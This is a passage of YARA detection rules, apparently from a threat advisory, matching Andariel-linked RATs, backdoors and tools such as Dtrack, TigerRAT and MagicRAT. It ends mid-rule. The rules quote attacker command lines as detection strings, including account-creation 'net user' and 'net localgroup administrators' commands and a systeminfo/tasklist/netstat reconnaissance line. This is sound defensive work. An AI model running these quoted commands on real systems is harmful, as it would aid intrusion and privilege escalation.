<td>rule Andariel_KaosRAT_Yamabot<br>{<br><br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $str1 = \"/kaos/\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str2 = \"Abstand [\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str3 = \"] anwenden\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str4 = \"cmVjYXB0Y2hh\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str5 = \"/bin/sh\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str6 = \"utilities.CIpaddress\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str7 = \"engine.NewEgg\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str8 = \"%s%04x%s%s%s\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str9 = \"Y2FwdGNoYV9zZXNzaW9u\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str10 = \"utilities.EierKochen\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str11 = \"kandidatKaufhaus\"<br><br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; 3 of them<br>}</td>
</tr>
<tr>
<td>rule TriFaux_EasyRAT_JUPITER<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $InitOnce = \"InitOnceExecuteOnce\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $BREAK = { 0D 00 0A 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 0D 00 0A }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $Bytes = \"4C,$00,$00,$00,$01,$14,$02,$00,$00,$00,$00,$00,$C0,$00,$00,$00,$00,$00,$00,\" wide<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_CutieDrop_MagicRAT<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strings:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $config_os_w = \"os/windows\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $config_os_l = \"os/linux\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $config_os_m = \"os/mac\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $config_comp_msft = \"company/microsoft\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $config_comp_orcl = \"company/oracle\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $POST_field_1 = \"session=\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $POST_field_2 = \"type=\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $POST_field_3 = \"id=\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $command_misspelled = \"renmae\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; condition:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint16(0) == 0x5a4d and 7 of them</td>
</tr>
<tr>
<td>rule Andariel_hhsd_FileTransferTool<br>{<br><br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; // 30 4D C7&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor&nbsp; &nbsp; &nbsp;[rbp+buffer_v41+3], cl<br>&nbsp; &nbsp; &nbsp; &nbsp; // 81 7D C4 22 C0 78 00&nbsp; &nbsp; cmp&nbsp; &nbsp; &nbsp; dword ptr [rbp+buffer_v41], 78C022h<br>&nbsp; &nbsp; &nbsp; &nbsp; // 44 88 83 00 01 00 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbx+100h], r8b<br>&nbsp; &nbsp; &nbsp; &nbsp; $handshake = { 30 ?? ?? 81 7? ?? 22 C0 78 00 4? 88 }<br>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; // B1 14&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov&nbsp; &nbsp; &nbsp;cl, 14h<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 F7 14 00 41 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbp+57h+Src], 410014h<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 FB 7A 00 7F 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbp+57h+var_5C], 7F007Ah<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 FF 7B 00 63 00&nbsp; &nbsp; mov &nbsp; &nbsp; [rbp+57h+var_58], 63007Bh<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 03 7A 00 34 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbp+57h+var_54], 34007Ah<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 07 51 00 66 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbp+57h+var_50], 660051h<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 0B 66 00 7B 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbp+57h+var_4C], 7B0066h<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 0F 66 00 00 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbp+57h+var_48], 66h ; 'f'<br>&nbsp; &nbsp; &nbsp; &nbsp; $err_xor_str = { 14 C7 [2] 14 00 41 00 C7 [2] 7A 00 7F 00 C7 [2] 7B 00 63 00 C7 [2] 7A 00 34 00 }<br>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; // 41 02 D0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add&nbsp; &nbsp; &nbsp;dl, r8b<br>&nbsp; &nbsp; &nbsp; &nbsp; // 44 02 DA&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add&nbsp; &nbsp; &nbsp;r11b, dl<br>&nbsp; &nbsp; &nbsp; &nbsp; // 3C 1F&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;cmp&nbsp; &nbsp; &nbsp;al, 1Fh<br>&nbsp; &nbsp; &nbsp; &nbsp; $buf_add_cmp_1f = { 4? 02 ?? 4? 02 ?? 3? 1F }</td>
</tr>
<tr>
<td>&nbsp; &nbsp; &nbsp; &nbsp; // B9 8D 10 B7 F8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp;ecx, 0F8B7108Dh<br>&nbsp; &nbsp; &nbsp; &nbsp; // E8 F1 BA FF FF&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; sub_140001280<br>&nbsp; &nbsp; &nbsp; &nbsp; $hash_call_loadlib = { B? 8D 10 B7 F8 E8 }<br>&nbsp; &nbsp; &nbsp; &nbsp; $hash_call_unk = { B? 91 B8 F6 88 E8 }<br>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and<br>&nbsp; &nbsp; &nbsp; &nbsp; (any of ($handshake, $err_xor_str, $buf_add_cmp_1f) and any of ($hash_call_*)) or<br>&nbsp; &nbsp; &nbsp; &nbsp; 2 of ($handshake, $err_xor_str, $buf_add_cmp_1f)</td>
</tr>
<tr>
<td>rule Andariel_Atharvan_3RAT<br>{<br>strings:<br>$3RAT = \"D:\\\\rang\\\\TOOL\\\\3RAT\"&nbsp;<br>$atharvan = \"Atharvan_dll.pdb\"<br>condition:<br>uint16(0) == 0x5a4d and any of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_LilithRAT_Variant<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; // The following are strings seen in the open source version of Lilith<br>&nbsp; &nbsp; &nbsp; &nbsp; $lilith_1 = \"Initiate a CMD session first.\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $lilith_2 = \"CMD is not open\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $lilith_3 = \"Couldn't write command\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $lilith_4 = \"Couldn't write to CMD: CMD not open\" ascii wide<br><br>&nbsp; &nbsp; &nbsp; &nbsp; // The following are strings that appear to be unique to the Unnamed Trojan based on Lilith<br>&nbsp; &nbsp; &nbsp; &nbsp; $unique_1 = \"Upload Error!\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $unique_2 = \"ERROR: Downloading is already running!\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $unique_3 = \"ERROR: Unable to open file:\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $unique_4 = \"General error\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $unique_5 = \"CMD error\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $unique_6 = \"killing self\" ascii wide<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and filesize &lt; 150KB and all of ($lilith_*) and 2 of ($unique_*)<br>}</td>
</tr>
<tr>
<td>rule Andariel_SocksTroy_Strings_OpCodes<br>{<br>&nbsp; &nbsp; &nbsp; &nbsp;strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $strHost = \"-host\" wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $strAuth = \"-auth\" wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $SocksTroy = \"SocksTroy\"&nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; $cOpCodeCheck = { 81 E? A0 00 00 00 0F 84 ?? ?? ?? ?? 83 E? 03 74 ?? 83 E? 02 74 ?? 83 F? 0B }<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and<br>&nbsp; &nbsp; &nbsp; &nbsp; ((1 of ($str*)) and&nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; (all of ($c*)) or (all of ($Socks*)))<br>}</td>
</tr>
<tr>
<td>rule Andariel_Agni<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $xor = { 34 ?? 88 01 48 8D 49 01 0F B6 01 84 C0 75 F1 }<br>&nbsp; &nbsp; &nbsp; &nbsp; $stackstrings = {C7 44 24 [5-10] C7 44 24 [5] C7 44 24 [5-10] C7 44 24 [5-10] C7 44 24}<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and (#xor &gt; 100 and #stackstrings &gt; 5)<br>}</td>
</tr>
<tr>
<td>rule Andariel_GoLang_validalpha_handshake<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $ = { 66 C7 00 AB CD C6 40 02 EF ?? 03 00 00 00 48 89 C1 ?? 03 00 00 00 }<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_GoLang_validalpha_tasks<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $ = \"main.ScreenMonitThread\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $ = \"main.CmdShell\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $ = \"main.GetAllFoldersAndFiles\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $ = \"main.SelfDelete\"<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_GoLang_validalpha_BlackString<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; $ = \"I:/01___Tools/02__RAT/Black\"<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; uint16(0) == 0x5A4D and all of them<br>}</td>
</tr>
<tr>
<td>rule INDICATOR_EXE_Packed_VMProtect {<br>&nbsp; &nbsp; &nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $s1 = \".vmp0\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $s2 = \".vmp1\" fullword ascii<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and all of them or<br>&nbsp; &nbsp; &nbsp; &nbsp; for any i in (0 .. pe.number_of_sections) : (<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pe.sections[i].name == \".vmp0\" or<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pe.sections[i].name == \".vmp1\"<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; )<br>&nbsp; &nbsp; &nbsp; &nbsp; )<br>}</td>
</tr>
<tr>
<td>rule INDICATOR_EXE_Packed_Themida {<br>&nbsp; &nbsp; &nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $s1 = \".themida\" fullword ascii<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and all of them or<br>&nbsp; &nbsp; &nbsp; &nbsp; for any i in (0 .. pe.number_of_sections) : (<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pe.sections[i].name == \".themida\"<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; )<br>&nbsp; &nbsp; &nbsp; &nbsp; )<br>}</td>
</tr>
<tr>
<td>rule Andariel_elf_backdoor_fipps<br>{<br>strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $a = \"found mac address\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $b = \"RecvThread\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $c = \"OpenSSL-1.0.0-fipps\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $d = \"Disconnected!\"<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; (all of them) and uint32(0) == 0x464c457f<br>}</td>
</tr>
<tr>
<td>rule Andariel_bindshell<br>{<br>strings:<br>&nbsp;$str_comspec = \"COMSPEC\"<br>&nbsp;$str_consolewindow = \"GetConsoleWindow\"<br>&nbsp;$str_ShowWindow = \"ShowWindow\"<br>&nbsp;$str_WSASocketA = \"WSASocketA\"<br>&nbsp;$str_CreateProcessA = \"CreateProcessA\"<br>&nbsp;$str_port = {B9 4D 05 00 00 89}<br>condition:<br>uint16(0) == 0x5A4D and all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_grease2<br>{<br>strings:<br>&nbsp;$str_rdpconf = \"c: \\\\windows\\\\temp\\\\RDPConf.exe\" fullword nocase<br>&nbsp;$str_rdpwinst = \"c: \\\\windows\\\\temp\\\\RDPWInst.exe\" fullword nocase<br>&nbsp;$str_net_user = \"net user\"<br>&nbsp;$str_admins_add = \"net localgroup administrators\"<br>condition:<br>uint16(0) == 0x5A4D and<br>all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_NoPineapple_Dtrack_unpacked<br>{<br>strings:<br>&nbsp;$str_nopineapple = \"&lt; No Pineapple! &gt;\"<br>&nbsp;$str_qt_library = \"Qt 5.12.10\"<br>&nbsp;$str_xor = {8B 10 83 F6 ?? 83 FA 01 77}<br>condition:<br>uint16(0) == 0x5A4D and<br>all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_dtrack_unpacked<br>{<br>strings:<br>&nbsp;$str_mutex = \"MTX_Global\"<br>&nbsp;$str_cmd_1 = \"/c net use \\\\\\\\\" wide<br>&nbsp;$str_cmd_2 = \"/c ping -n 3 127.0.01 &gt; NUL % echo EEE &gt; \\\"%s\\\"\" wide<br>&nbsp;$str_cmd_3 = \"/c move /y %s \\\\\\\\\" wide<br>&nbsp;$str_cmd_4 = \"/c systeminfo &gt; \\\"%s\\\" &amp; tasklist &gt; \\\"%s\\\" &amp; netstat -naop tcp &gt; \\\"%s\\\"\" wide<br>condition:<br>uint16(0) == 0x5A4D and<br>all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_TigerRAT_crowdsourced_rule {<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $m1 = \".?AVModuleKeyLogger@@\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $m2 = \".?AVModulePortForwarder@@\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $m3 = \".?AVModuleScreenCapture@@\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $m4 = \".?AVModuleShell@@\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $s1 = \"\\\\x9891-009942-xnopcopie.dat\" fullword wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $s2 = \"(%02d : %02d-%02d %02d:%02d:%02d)--- %s[Clipboard]\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $s3 = \"[%02d : %02d-%02d %02d:%02d:%02d]--- %s[Title]\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $s4 = \"del \\\"%s\\\"%s \\\"%s\\\" goto \" ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $s5 = \"[&lt;&lt;]\" fullword ascii<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and (all of ($s*) or (all of ($m*) and 1 of ($s*)) or (2 of ($m*) and 2 of ($s*)))<br>}</td>
</tr>
<tr>
<td>rule win_tiger_rat_auto {<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_0 = { 33c0 89442438 89442430 448bcf 4533c0 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;33c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; 5<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;89442438&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;89442430&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;448bcf&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| movzx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, byte ptr [eax]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4533c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_1 = { 41b901000000 488bd6 488bcb e8???????? }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;41b901000000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bd6&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ecx]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bcb&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;8<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_2 = { 4881ec90050000 8b01 8985c8040000 8b4104 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4881ec90050000&nbsp; &nbsp; &nbsp; &nbsp;| test&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax, eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b01&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jns&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x16<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8985c8040000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4104&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ecx]<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_3 = { 488b01 ff10 488b4f08 4c8d4c2430 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b01&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, esi<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;ff10&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b4f08&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, ebx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4c8d4c2430&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| inc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_4 = { 488b01 ff10 488b4e18 488b01 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b01&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;ff10&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| cmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ecx + 0x18], 0x10<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b4e18&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b01&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| sub&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, 0x590<br><br>&nbsp; &nbsp; &nbsp; 